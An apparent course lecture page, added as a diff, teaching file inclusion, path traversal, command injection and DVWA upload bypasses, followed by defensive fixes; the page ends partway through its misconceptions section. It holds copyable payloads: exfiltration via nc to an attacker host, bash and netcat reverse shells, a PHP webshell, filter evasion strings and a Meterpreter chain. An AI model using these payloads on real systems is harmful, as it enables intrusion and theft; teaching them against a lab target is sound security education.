+                    <span class="topic-tag">🛡️ Shell Escaping</span>
+                </div>
+
+                <div class="guide-usage-card">
+                    <div class="guide-usage-icon">🔑</div>
+                    <div class="guide-usage-content">
+                        <div class="guide-usage-title">OVERVIEW</div>
+                        <p>This Week 6 lecture covers four high-impact web vulnerability classes, explains how each one
+                            escalates toward remote code execution (RCE), and closes with defensive coding guidance, a
+                            combined exploitation scenario, and lab preparation against DVWA (Damn Vulnerable Web
+                            Application)[cite: 3].</p>
+                        <p>The four classes share a single root cause: untrusted input reaches a sensitive operation,
+                            such as a file include, a filesystem call, a shell invocation, or a file write, without
+                            adequate validation[cite: 3].</p>
+                    </div>
+                </div>
+            </header>
+
+            <section id="mod-1" class="content-card section-card" data-section-num="1">
+                <div class="section-card-header">
+                    <div class="sec-num-badge">01</div>
+                    <div class="sec-title-wrap">
+                        <span class="sec-kicker">PART 1</span>
+                        <h2 class="section-heading" id="mod-1">Local and Remote File Inclusion (LFI/RFI)</h2>
+                    </div>
+                    <a class="anchor-link" href="#mod-1">#</a>
+                </div>
+
+                <h3>Definition and the PHP include family</h3>
+                <p>File inclusion occurs when user input controls the path passed to a PHP include-family function[cite:
+                    3]. These functions differ mainly in how they fail[cite: 3]. include() and include_once() emit only
+                    a warning if the target file is missing, while require() and require_once() halt the script with a
+                    fatal error[cite: 3]. The _once variants also prevent the same file from being included twice[cite:
+                    3].</p>
+
+                <div class="table-responsive">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Function[cite: 3]</th>
+                                <th>On missing file[cite: 3]</th>
+                                <th>Re-include?[cite: 3]</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>include()[cite: 3]</td>
+                                <td>Warning only[cite: 3]</td>
+                                <td>Yes, on every call[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>require()[cite: 3]</td>
+                                <td>Fatal error[cite: 3]</td>
+                                <td>Yes, on every call[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>include_once()[cite: 3]</td>
+                                <td>Warning only[cite: 3]</td>
+                                <td>No, included once[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>require_once()[cite: 3]</td>
+                                <td>Fatal error[cite: 3]</td>
+                                <td>No, included once[cite: 3]</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <p>The vulnerable pattern is a page loader that passes a request parameter straight to include[cite: 3].
+                    An attacker who controls that parameter can point it at any file the web process can read[cite: 3].
+                </p>
+
+                <div class="terminal-card">
+                    <div class="terminal-header">
+                        <div class="terminal-dots"><span class="dot dot-red"></span><span
+                                class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                        <div class="terminal-title">Vulnerable Include Payload[cite: 3]</div>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                    </div>
+                    <div class="terminal-body">
+                        <div class="terminal-line">
+                            <span class="terminal-cmd">&lt;?php
+                                // developer never validated the page parameter
+                                include($_GET['page']);
+                                // attacker: ?page=../../../../etc/passwd
+                                // attacker: ?page=http://attacker.com/shell.txt
+                                ?&gt;</span>
+                        </div>
+                    </div>
+                </div>
+
+                <h3>LFI versus RFI, and the allow_url_include switch</h3>
+                <p>The lecture separates two attack types[cite: 3]. Local File Inclusion (LFI) lets an attacker read or
+                    execute files already on the server, such as configuration files, logs, and session data, by
+                    climbing the directory tree with ../ sequences[cite: 3]. Remote File Inclusion (RFI) causes the
+                    server to fetch and execute PHP code from an attacker-controlled URL, which yields direct RCE as the
+                    web-server user[cite: 3]. A single PHP setting, allow_url_include, decides whether an include-family
+                    function may pull code from a remote URL[cite: 3]. It is Off by default in modern PHP, so RFI
+                    usually fails, but LFI remains dangerous because it can be escalated to RCE[cite: 3].</p>
+
+                <div class="table-responsive">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Dimension[cite: 3]</th>
+                                <th>LFI (Local File Inclusion)[cite: 3]</th>
+                                <th>RFI (Remote File Inclusion)[cite: 3]</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Precondition[cite: 3]</td>
+                                <td>Path argument is user-controlled[cite: 3]</td>
+                                <td>Path is user-controlled AND allow_url_include = On AND payload starts with
+                                    http(s)://[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>Example payload[cite: 3]</td>
+                                <td>?page=../../../../etc/passwd[cite: 3]</td>
+                                <td>?page=http://attacker.com/shell.txt[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>Risk level[cite: 3]</td>
+                                <td>High: disclosure, escalates to RCE via poisoning[cite: 3]</td>
+                                <td>Critical: instant RCE[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>Typical outcome[cite: 3]</td>
+                                <td>Source disclosure, credential theft, then RCE via log or session poisoning or
+                                    php://input[cite: 3]</td>
+                                <td>Attacker-controlled PHP body is fetched and executed by the victim server[cite: 3]
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>Default PHP config[cite: 3]</td>
+                                <td>Exploitable whenever the path is unfiltered[cite: 3]</td>
+                                <td>Blocked, since allow_url_include = Off by default[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>Primary defense[cite: 3]</td>
+                                <td>Strict allow-list; canonicalize and verify the path lies within the base
+                                    directory[cite: 3]</td>
+                                <td>Keep allow_url_include = Off; same allow-list controls; disable allow_url_fopen if
+                                    unused[cite: 3]</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <p>A useful mental model: LFI is a locality problem (where can the path point on this machine?), and RFI
+                    is a protocol problem (can the path point off the machine?)[cite: 3]. Both share one fix[cite: 3].
+                    Raw user input should never reach an include-family path argument[cite: 3].</p>
+
+                <h3>LFI mechanics and file disclosure</h3>
+                <p>A benign page request such as index.php?page=about.php resolves to a file in the pages
+                    directory[cite: 3]. The moment the developer concatenates the parameter into the path without
+                    filtering, ../ sequences escape that directory[cite: 3]. Each ../ moves one level toward the
+                    filesystem root, so enough of them land at / before the target path is appended[cite: 3]. Common
+                    disclosure targets include /etc/passwd as proof of read, /proc/self/environ for environment
+                    variables, and /var/www/.htpasswd for credentials[cite: 3].</p>
+
+                <h3>PHP wrappers and escalation from LFI to RCE</h3>
+                <p>When RFI is blocked, the lecture shows that plain LFI can still reach code execution through several
+                    routes[cite: 3]. The php://filter wrapper reads a PHP file's source as base64 text rather than
+                    executing it, which typically exposes database credentials once the string is decoded[cite: 3]. The
+                    php://input wrapper treats the raw POST body as the included file, so PHP code sent in the body is
+                    executed[cite: 3].</p>
+
+                <div class="terminal-card">
+                    <div class="terminal-header">
+                        <div class="terminal-dots"><span class="dot dot-red"></span><span
+                                class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                        <div class="terminal-title">PHP Wrappers[cite: 3]</div>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                    </div>
+                    <div class="terminal-body">
+                        <div class="terminal-line">
+                            <span class="terminal-cmd"># Read PHP source as base64 (avoids execution):
+                                ?page=php://filter/convert.base64-encode/resource=config.php
+                                # returns a base64 string; decode it to read the source and DB credentials
+
+                                # Execute code from the POST body:
+                                ?page=php://input
+                                POST body: &lt;?php system('id');?&gt;</span>
+                        </div>
+                    </div>
+                </div>
+
+                <p>Log poisoning works by sending a request whose User-Agent header contains PHP code[cite: 3]. The
+                    server writes that header into its access log, and including the log file through the LFI then
+                    executes the embedded code[cite: 3]. Session poisoning follows the same pattern: a payload is stored
+                    in a session variable, such as a username field, which lands in a file like
+                    /var/lib/php/sessions/sess_&lt;PHPSESSID&gt;, and including that file runs the payload[cite: 3].</p>
+            </section>
+
+            <section id="mod-2" class="content-card section-card" data-section-num="2">
+                <div class="section-card-header">
+                    <div class="sec-num-badge">02</div>
+                    <div class="sec-title-wrap">
+                        <span class="sec-kicker">PART 2</span>
+                        <h2 class="section-heading" id="mod-2">Path Traversal</h2>
+                    </div>
+                    <a class="anchor-link" href="#mod-2">#</a>
+                </div>
+                <p>Path traversal manipulates file-path input so that the application opens a file outside its intended
+                    directory[cite: 3]. The distinction from LFI is one of scope[cite: 3]. Traversal can reach any
+                    file-access function, including readfile, file_get_contents, and fopen, while LFI specifically
+                    targets the include family and usually results in code execution[cite: 3].</p>
+
+                <p>A typical vulnerable endpoint concatenates a file parameter onto a base directory and passes the
+                    result to readfile[cite: 3]. Requesting download.php?f=../../../../etc/passwd from a script located
+                    in /var/www/html/uploads/ climbs four levels and reads /etc/passwd[cite: 3].</p>
+
+                <div class="terminal-card">
+                    <div class="terminal-header">
+                        <div class="terminal-dots"><span class="dot dot-red"></span><span
+                                class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                        <div class="terminal-title">Path Traversal Payload[cite: 3]</div>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                    </div>
+                    <div class="terminal-body">
+                        <div class="terminal-line">
+                            <span class="terminal-cmd"># download.php
+                                &lt;?php readfile("/var/www/html/uploads/" . $_GET['f']); ?&gt;
+                                GET /download.php?f=../../../../etc/passwd</span>
+                        </div>
+                    </div>
+                </div>
+
+                <h3>Common vulnerable parameters</h3>
+                <p>Path traversal appears wherever an application takes a filename from the request[cite: 3]. The
+                    lecture lists file downloads (?file=report.pdf), image display (?img=/uploads/avatar.png), log
+                    viewers (?log=access), template loaders (?tpl=header.html), and document renderers
+                    (?doc=invoice_2024.pdf) as typical sinks[cite: 3].</p>
+
+                <h3>Encoding bypasses</h3>
+                <p>Encoding attacks succeed when the filter inspects the raw input, but the application decodes the
+                    input later[cite: 3]. The check and the use then see different strings[cite: 3]. A filter that
+                    searches for the literal ../ will not match %2e%2e%2f, yet the application may decode that value
+                    into ../ at the point of use[cite: 3]. Double encoding (%252e%252e%252f) survives two decode
+                    passes[cite: 3]. Other forms the lecture mentions include null-byte injection (file.php%00.jpg,
+                    which truncated older PHP strings at the null byte, fixed in PHP 5.3.4) and mixed separators such as
+                    ..\ on Windows targets[cite: 3].</p>
+
+                <div class="terminal-card">
+                    <div class="terminal-header">
+                        <div class="terminal-dots"><span class="dot dot-red"></span><span
+                                class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                        <div class="terminal-title">Encoding Bypass Payload[cite: 3]</div>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                    </div>
+                    <div class="terminal-body">
+                        <div class="terminal-line">
+                            <span class="terminal-cmd"># Filter strips literal "../"; attacker sends the encoded form:
+                                ?f=%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+                                # Double-encoded form survives two decodes:
+                                ?f=%252e%252e%252f -> decode -> %2e%2e%2f -> decode ->../</span>
+                        </div>
+                    </div>
+                </div>
+
+                <h3>Why blacklisting ../ fails</h3>
+                <p>PHP's str_replace is non-recursive, so removing ../ once can recreate the sequence[cite: 3]. Given
+                    the input ....//....//etc/passwd, the single pass removes the inner ../ and the surrounding dots and
+                    slashes recombine into ../../etc/passwd[cite: 3]. Absolute paths defeat the same filter from a
+                    different angle[cite: 3]. If the application prepends a base directory but then accepts an absolute
+                    path, supplying /etc/passwd replaces the base entirely, and no ../ appears in the input at all[cite:
+                    3].</p>
+
+                <div class="terminal-card">
+                    <div class="terminal-header">
+                        <div class="terminal-dots"><span class="dot dot-red"></span><span
+                                class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                        <div class="terminal-title">Filter Bypasses[cite: 3]</div>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                    </div>
+                    <div class="terminal-body">
+                        <div class="terminal-line">
+                            <span class="terminal-cmd"># non-recursive strip bypass
+                                $input = "....//....//etc/passwd";
+                                $clean = str_replace("../", "", $input); // -> "../../etc/passwd"
+
+                                # absolute path override
+                                $f = "/var/www/uploads/" . $_GET['f'];
+                                ?f=/etc/passwd // -> "/etc/passwd"</span>
+                        </div>
+                    </div>
+                </div>
+
+                <p>The lesson is that a blacklist on ../ misses encodings, recursive-strip bypasses, and absolute
+                    paths[cite: 3]. The reliable fix is to canonicalize the path first and then verify that the result
+                    stays within the base directory[cite: 3].</p>
+            </section>
+
+            <section id="mod-3" class="content-card section-card" data-section-num="3">
+                <div class="section-card-header">
+                    <div class="sec-num-badge">03</div>
+                    <div class="sec-title-wrap">
+                        <span class="sec-kicker">PART 3</span>
+                        <h2 class="section-heading" id="mod-3">Command Injection</h2>
+                    </div>
+                    <a class="anchor-link" href="#mod-3">#</a>
+                </div>
+                <p>Week 3 introduced command injection, including the distinction between blind and active variants and
+                    basic enumeration[cite: 3]. This week's coverage goes deeper into operator semantics, filter
+                    evasion, and escalation to an interactive reverse shell[cite: 3]. The vulnerable pattern is a
+                    network diagnostics page that concatenates user input raw into a shell string[cite: 3].</p>
+
+                <div class="terminal-card">
+                    <div class="terminal-header">
+                        <div class="terminal-dots"><span class="dot dot-red"></span><span
+                                class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                        <div class="terminal-title">Command Injection Payload[cite: 3]</div>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                    </div>
+                    <div class="terminal-body">
+                        <div class="terminal-line">
+                            <span class="terminal-cmd"># diag.php - "network diagnostics"
+                                &lt;?php echo shell_exec("ping -c 4 ". $_GET['ip']); ?&gt;
+                                GET /diag.php?ip=127.0.0.1;whoami # sequential
+                                GET /diag.php?ip=127.0.0.1 && whoami # conditional</span>
+                        </div>
+                    </div>
+                </div>
+
+                <p>Both payloads work because the ip value reaches /bin/sh unescaped[cite: 3]. Any shell metacharacter
+                    inside it is interpreted by the shell, so the developer loses control of where the command
+                    ends[cite: 3].</p>
+
+                <h3>Command-chaining operators</h3>
+                <p>Each operator has a distinct semantic, and choosing the right one matters when only one outcome can
+                    be observed[cite: 3]. The semicolon is the default because it runs the second command
+                    unconditionally[cite: 3]. The && operator runs the second command only if the first exits with
+                    status zero, which suits cases where the first command must succeed[cite: 3]. The || operator runs
+                    the second command only on failure, which helps when the first command must fail, such as an
+                    unreachable host[cite: 3]. The pipe | feeds the first command's output into the second, which is
+                    useful for exfiltration[cite: 3]. Backticks and $() substitute the inner command's output into an
+                    argument, and the > and >> redirections write output to a file that can be read back later through
+                    an LFI or webshell[cite: 3].</p>
+
+                <div class="table-responsive">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Operator[cite: 3]</th>
+                                <th>Behavior[cite: 3]</th>
+                                <th>Example[cite: 3]</th>
+                                <th>Use when[cite: 3]</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>;[cite: 3]</td>
+                                <td>Runs second command unconditionally[cite: 3]</td>
+                                <td>ping -c 4 127.0.0.1;whoami[cite: 3]</td>
+                                <td>Default; second payload always wanted[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>&&[cite: 3]</td>
+                                <td>Runs second only if first succeeds[cite: 3]</td>
+                                <td>ping -c 4 127.0.0.1 && id[cite: 3]</td>
+                                <td>First command must validate something[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>||[cite: 3]</td>
+                                <td>Runs second only if first fails[cite: 3]</td>
+                                <td>ping -c 4 invalid || id[cite: 3]</td>
+                                <td>First command must fail to trigger payload[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>|[cite: 3]</td>
+                                <td>Pipes stdout of first into second[cite: 3]</td>
+                                <td>cat /etc/passwd | nc attacker 4444[cite: 3]</td>
+                                <td>Output must feed the next command (exfiltration)[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>`cmd` / $(cmd)[cite: 3]</td>
+                                <td>Substitutes inner output inline[cite: 3]</td>
+                                <td>echo "$(whoami)"[cite: 3]</td>
+                                <td>Payload must sit inside an argument[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>>, >>[cite: 3]</td>
+                                <td>Redirects output to a file[cite: 3]</td>
+                                <td>id > /tmp/out[cite: 3]</td>
+                                <td>Blind exfiltration to a readable file[cite: 3]</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h3>Filter and WAF bypass techniques</h3>
+                <p>A blocked character is rarely a closed door, because the shell offers several equivalent spellings
+                    for the same token[cite: 3]. When a space is filtered, the $IFS variable (Internal Field Separator,
+                    whose default value is whitespace) substitutes for it, and alternatives such as ${IFS},
+                    {cat,/etc/passwd}, or a redirection like &lt;/etc/passwd also work[cite: 3]. When a keyword is
+                    blocked, quote characters, empty variables, and glob patterns can rebuild it, because the shell
+                    strips quotes and expands variables before executing[cite: 3]. Encoding the payload, for example by
+                    base64-decoding it on the target, hides it from pattern-based filters entirely[cite: 3].</p>
+
+                <div class="terminal-card">
+                    <div class="terminal-header">
+                        <div class="terminal-dots"><span class="dot dot-red"></span><span
+                                class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                        <div class="terminal-title">Filter Evasion Payload[cite: 3]</div>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                    </div>
+                    <div class="terminal-body">
+                        <div class="terminal-line">
+                            <span class="terminal-cmd"># Blocked space -> $IFS
+                                ?f=127.0.0.1;cat$IFS/etc/passwd
+
+                                # Blocked keyword "whoami" -> quote splitting, empty variable, glob
+                                ?f=;w'h'oami;w"h"oami;who${empty}ami;/???/??ami
+
+                                # Encoded payload decoded on the victim
+                                ?f=;echo d2hvYW1pCg== | base64 -d | sh</span>
+                        </div>
+                    </div>
+                </div>
+
+                <p>The unifying principle is that the shell evaluates variables, globs, and quotes before it runs a
+                    command[cite: 3]. Any filter that inspects the raw string earlier in that pipeline can be evaded by
+                    spelling the forbidden token in a form that resolves to it later[cite: 3].</p>
+
+                <h3>Escalation to a reverse shell</h3>
+                <p>A single injection is enough to push a connection back to the attacker's listener, which yields an
+                    interactive shell[cite: 3]. The lecture offers several options depending on what the target
+                    provides[cite: 3]. Netcat with the -e flag is the simplest, but many distributions ship an OpenBSD
+                    build of nc that lacks -e[cite: 3]. The bash /dev/tcp pseudo-device needs no netcat at all, and
+                    Python and Perl one-liners serve as fallbacks when those interpreters are present[cite: 3]. Even
+                    blind injection, with no visible output, can deliver a reverse shell, because the command still
+                    runs[cite: 3].</p>
+
+                <div class="terminal-card">
+                    <div class="terminal-header">
+                        <div class="terminal-dots"><span class="dot dot-red"></span><span
+                                class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                        <div class="terminal-title">Reverse Shell Payload[cite: 3]</div>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                    </div>
+                    <div class="terminal-body">
+                        <div class="terminal-line">
+                            <span class="terminal-cmd"># Attacker listener
+                                $ nc -lvnp 4444
+
+                                # Netcat with -e
+                                GET /diag.php?ip=127.0.0.1;nc -e /bin/bash 10.10.14.7 4444
+
+                                # Bash built-in, no nc needed
+                                GET /diag.php?ip=127.0.0.1;bash -i >& /dev/tcp/10.10.14.7/4444 0>&1</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="mod-4" class="content-card section-card" data-section-num="4">
+                <div class="section-card-header">
+                    <div class="sec-num-badge">04</div>
+                    <div class="sec-title-wrap">
+                        <span class="sec-kicker">PART 4</span>
+                        <h2 class="section-heading" id="mod-4">File Upload Vulnerabilities (DVWA)</h2>
+                    </div>
+                    <a class="anchor-link" href="#mod-4">#</a>
+                </div>
+                <p>An upload feature that writes attacker-supplied code into a web-accessible directory gives the
+                    attacker a webshell, and a webshell provides command execution as the web-server user[cite: 3]. The
+                    lecture uses DVWA, with its three security levels (Low, Medium, High), to show that each level adds
+                    one check and that each check has a matching bypass[cite: 3]. The source for these checks is on
+                    GitHub at digininja/DVWA[cite: 3].</p>
+
+                <h3>Low: no validation</h3>
+                <p>The Low level performs no checks at all[cite: 3]. A local file containing a one-line PHP webshell is
+                    uploaded directly, and the attacker then requests it from the uploads directory with a cmd
+                    parameter[cite: 3]. Because the file sits inside the web root with an executable extension, the
+                    server parses and runs it[cite: 3].</p>
+
+                <div class="terminal-card">
+                    <div class="terminal-header">
+                        <div class="terminal-dots"><span class="dot dot-red"></span><span
+                                class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                        <div class="terminal-title">Webshell Payload[cite: 3]</div>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                    </div>
+                    <div class="terminal-body">
+                        <div class="terminal-line">
+                            <span class="terminal-cmd"># shell.php
+                                &lt;?php system($_GET['cmd']); ?&gt;
+
+                                GET /DVWA/hackable/uploads/shell.php?cmd=whoami -> www-data</span>
+                        </div>
+                    </div>
+                </div>
+
+                <h3>Medium: Content-Type check</h3>
+                <p>The Medium level reads $_FILES['file']['type'] and accepts only image/jpeg or image/png[cite: 3].
+                    That value comes from the Content-Type header in the multipart part, which the client sets[cite: 3].
+                    The server therefore trusts an attacker-controlled value[cite: 3]. Intercepting the upload in Burp
+                    Suite and changing the inner part header to image/jpeg, while leaving the PHP body and the filename
+                    shell.php unchanged, passes the check[cite: 3]. The file is stored with its PHP content intact[cite:
+                    3].</p>
+
+                <h3>High: extension whitelist and getimagesize()</h3>
+                <p>The High level enforces an extension whitelist and calls getimagesize() on the uploaded bytes, which
+                    must report valid image dimensions[cite: 3]. getimagesize() identifies a file by its magic bytes,
+                    the leading signature that declares its format[cite: 3]. Prepending a valid GIF header (GIF89a;) to
+                    the PHP code satisfies that check, and naming the file shell.php.jpg satisfies the extension
+                    whitelist[cite: 3]. Whether the server then runs the file as PHP depends on configuration[cite: 3].
+                    By default, Apache uses the last extension (.jpg) and serves the file as an image, so the attacker
+                    must sometimes rename it afterward[cite: 3].</p>
+
+                <div class="terminal-card">
+                    <div class="terminal-header">
+                        <div class="terminal-dots"><span class="dot dot-red"></span><span
+                                class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                        <div class="terminal-title">Magic Bytes Payload[cite: 3]</div>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                    </div>
+                    <div class="terminal-body">
+                        <div class="terminal-line">
+                            <span class="terminal-cmd">$ printf 'GIF89a;\n&lt;?php system($_GET["cmd"]);?&gt;' >
+                                shell.php
+                                # upload as shell.php.jpg
+                                GET /DVWA/hackable/uploads/shell.php.jpg?cmd=whoami</span>
+                        </div>
+                    </div>
+                </div>
+
+                <h3>Level comparison</h3>
+                <div class="table-responsive">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Level[cite: 3]</th>
+                                <th>Check performed[cite: 3]</th>
+                                <th>Bypass technique[cite: 3]</th>
+                                <th>Payload[cite: 3]</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Low[cite: 3]</td>
+                                <td>None[cite: 3]</td>
+                                <td>Direct upload[cite: 3]</td>
+                                <td>shell.php with the system() one-liner[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>Medium[cite: 3]</td>
+                                <td>Client-supplied Content-Type in {image/jpeg, image/png}[cite: 3]</td>
+                                <td>Content-Type spoof via Burp Repeater; body and filename unchanged[cite: 3]</td>
+                                <td>Inner Content-Type set to image/jpeg[cite: 3]</td>
+                            </tr>
+                            <tr>
+                                <td>High[cite: 3]</td>
+                                <td>Extension whitelist and getimagesize() on bytes[cite: 3]</td>
+                                <td>Prepend GIF89a; magic bytes; use double extension shell.php.jpg[cite: 3]</td>
+                                <td>containing GIF89a; followed by PHP[cite: 3]</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                <p>The pattern across levels is that every check inspects a single dimension (name, MIME type, or
+                    bytes), and every bypass targets exactly that dimension[cite: 3]. Effective defense therefore means
+                    stacking orthogonal checks rather than repeating the same one[cite: 3].</p>
+
+                <h3>Full escalation chain: upload to Meterpreter</h3>
+                <p>The High-level bypass produces a webshell, and the webshell can then promote itself into a richer
+                    foothold[cite: 3]. The attacker first confirms execution with whoami[cite: 3]. Next, the webshell
+                    renames the double-extension file to a clean .php name, which guarantees PHP execution[cite: 3].
+                    Finally, a Meterpreter payload built with msfvenom is uploaded through the same bypass and triggered
+                    by requesting it, while a multi/handler listener catches the connection[cite: 3]. The result is
+                    persistent, multi-channel access suitable for post-exploitation[cite: 3].</p>
+
+                <div class="terminal-card">
+                    <div class="terminal-header">
+                        <div class="terminal-dots"><span class="dot dot-red"></span><span
+                                class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                        <div class="terminal-title">Meterpreter Escalation[cite: 3]</div>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                    </div>
+                    <div class="terminal-body">
+                        <div class="terminal-line">
+                            <span class="terminal-cmd"># Step 2: rename via the webshell
+                                GET /DVWA/hackable/uploads/shell.php.jpg?cmd=mv shell.php.jpg shell.php
+
+                                # Step 3: build payload and start handler
+                                $ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f raw > msf.php
+                                msf6 > use exploit/multi/handler
+                                msf6 > set PAYLOAD php/meterpreter/reverse_tcp
+                                msf6 > run
+                                # browse to /hackable/uploads/msf.php, then:
+                                meterpreter > getuid</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="mod-5" class="content-card section-card" data-section-num="5">
+                <div class="section-card-header">
+                    <div class="sec-num-badge">05</div>
+                    <div class="sec-title-wrap">
+                        <span class="sec-kicker">PART 5</span>
+                        <h2 class="section-heading" id="mod-5">Defensive Coding and Remediation</h2>
+                    </div>
+                    <a class="anchor-link" href="#mod-5">#</a>
+                </div>
+                <p>The four classes share a defensive shape: do not pass untrusted input to filesystem, include, or
+                    shell APIs, and where unavoidable, constrain the input to a known-good set before it arrives
+                    there[cite: 3]. The lecture ties the classes to two OWASP Top 10 categories[cite: 3]. Command
+                    injection and file inclusion fall under A03 (Injection), while path traversal and upload abuse fall
+                    under A01 (Broken Access Control)[cite: 3].</p>
+
+                <h3>File inclusion and path traversal</h3>
+                <p>For file inclusion, the strongest defense is to avoid dynamic include paths altogether[cite: 3]. A
+                    router or switch statement on a fixed page identifier, or an allow-list array that maps ?page=about
+                    to pages/about.php, removes user control over the path[cite: 3]. Where remote includes are not
+                    required, allow_url_include and allow_url_fopen should be disabled in php.ini[cite: 3]. The
+                    dangerous wrappers and functions can be restricted through disable_functions, and file access can be
+                    confined with open_basedir[cite: 3]. Logs and session storage should live outside the web root
+                    without PHP execution permissions, which blunts log and session poisoning[cite: 3].</p>
+
+                <p>For path traversal, the correct order is canonicalize first, then check[cite: 3]. realpath() resolves
+                    ../, symlinks, and encodings into one absolute path, and the result must begin with the base
+                    directory followed by a separator[cite: 3]. basename() helps but cannot prevent a symlink escape on
+                    its own, and stripping ../ from raw input should never be relied on[cite: 3].</p>
+
+                <div class="terminal-card">
+                    <div class="terminal-header">
+                        <div class="terminal-dots"><span class="dot dot-red"></span><span
+                                class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                        <div class="terminal-title">Path Canonicalization Fix[cite: 3]</div>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                    </div>
+                    <div class="terminal-body">
+                        <div class="terminal-line">
+                            <span class="terminal-cmd">$base = realpath('/var/www/uploads');
+                                $target = realpath($base . '/'. $_GET['f']);
+                                if ($target === false || strpos($target, $base. '/')!== 0) {
+                                http_response_code(403);
+                                exit('forbidden');
+                                }
+                                readfile($target); // safe</span>
+                        </div>
+                    </div>
+                </div>
+
+                <h3>Command injection</h3>
+                <p>The core rule is never to build a shell string from user input[cite: 3]. In Python, arguments should
+                    be passed as a list with shell=False so that no shell parses them[cite: 3]. In PHP, escapeshellarg()
+                    must wrap each value when a shell is unavoidable[cite: 3]. Inputs should also be validated strictly,
+                    so an IP parameter is parsed as an IP address and a hostname parameter is checked against hostname
+                    syntax, and the process should run as a least-privilege account with no sudo or NOPASSWD
+                    rights[cite: 3].</p>
+
+                <div class="terminal-card">
+                    <div class="terminal-header">
+                        <div class="terminal-dots"><span class="dot dot-red"></span><span
+                                class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                        <div class="terminal-title">Command Injection Fix[cite: 3]</div>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                    </div>
+                    <div class="terminal-body">
+                        <div class="terminal-line">
+                            <span class="terminal-cmd"># Python: list arguments, no shell
+                                subprocess.run(["ping", "-c", "4", user_ip], shell=False)
+
+                                // PHP: escape each value
+                                shell_exec("ping -c 4 ". escapeshellarg($_GET['ip']));</span>
+                        </div>
+                    </div>
+                </div>
+
+                <h3>File upload (defense in depth)</h3>
+                <p>No single upload control is sufficient, so the lecture recommends layering several[cite: 3]. Validate
+                    the file by its actual content rather than the client-supplied Content-Type, and verify that the
+                    magic bytes match the claimed type[cite: 3]. Re-encoding images through GD or ImageMagick and
+                    rejecting files that fail to decode defeats polyglot payloads such as GIF89a; prefixes[cite: 3].
+                    Server-chosen random names with a single whitelisted extension remove both the attacker's filename
+                    and double-extension tricks[cite: 3]. Uploads should be stored outside the web root and served
+                    through a download script[cite: 3]. Script execution must be disabled in the upload directory, for
+                    example with php_flag engine off in Apache or a location block that returns 403 for PHP files in
+                    nginx[cite: 3]. Size and rate limits round out the controls against abuse and staging attacks[cite:
+                    3].</p>
+            </section>
+
+            <section id="mod-6" class="content-card section-card" data-section-num="6">
+                <div class="section-card-header">
+                    <div class="sec-num-badge">06</div>
+                    <div class="sec-title-wrap">
+                        <span class="sec-kicker">PART 6</span>
+                        <h2 class="section-heading" id="mod-6">Common Misconceptions and Real-World Breaches</h2>
+                    </div>
+                    <a class="anchor-link" href="#mod-6">#</a>
+                </div>
+
+                <h3>Common Misconceptions</h3>
+                <p>Three beliefs quietly break production systems[cite: 3]. The first is that blacklisting ../ stops
+                    path traversal[cite: 3]. The ../ token is the visible attack string, so blocking it feels complete,
+                    yet encodings, recursive-strip bypasses, mixed separators, and absolute paths all evade a literal
+                    blacklist[cite: 3]. Canonicalize-then-verify is the only robust fix[cite: 3].</p>
